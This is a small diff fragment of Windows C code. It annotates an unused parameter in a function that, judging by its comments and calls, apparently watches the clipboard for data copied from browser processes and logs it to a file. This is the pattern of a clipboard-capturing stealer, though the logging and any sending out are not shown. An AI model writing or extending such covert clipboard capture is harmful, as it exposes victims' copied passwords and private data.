@@ -96,7 +96,7 @@ int isBrowserProcess(HWND hwndOwner) {
 }
 
 // Monitors the clipboard for data set by browser processes
-void monitorClipboard(const char *targetExe, const char *logFilePath) {
+void monitorClipboard(const char *targetExe __attribute__((unused)), const char *logFilePath) {
     while (1) {
         // Get the current clipboard owner window handle
         HWND hwndOwner = GetClipboardOwner();
